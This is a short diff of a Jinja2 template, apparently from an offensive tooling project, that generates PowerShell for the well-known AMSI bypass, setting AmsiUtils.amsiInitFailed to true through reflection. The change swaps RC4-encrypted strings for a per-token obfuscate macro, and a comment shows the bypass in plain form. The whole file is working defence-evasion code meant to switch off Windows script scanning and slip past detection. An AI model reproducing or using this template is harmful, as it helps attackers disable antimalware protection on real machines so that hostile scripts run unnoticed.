@@ -1,12 +1,4 @@
-{% set strings = [
-    'System.Management.Automation.AmsiUtils',
-    'amsiInitFailed',
-    'NonPublic,Static',
-]%}
+{% from 'macros.jinja2' import obfuscate with context%}
 
-{% for s in strings %}
-    $refstring{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
-{% endfor %}
-
-
-[Ref].Assembly.GetType($refstring1).GetField($refstring2,$refstring3).SetValue($null,$true)
+{# [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true) #}
+[Ref].{{obfuscate("Assembly")}}.{{obfuscate("GetType")}}({{obfuscate("System.Management.Automation.AmsiUtils")}}).{{obfuscate("GetField")}}({{obfuscate("amsiInitFailed")}},{{obfuscate("NonPublic,Static")}}).{{obfuscate("SetValue")}}($null,$true)
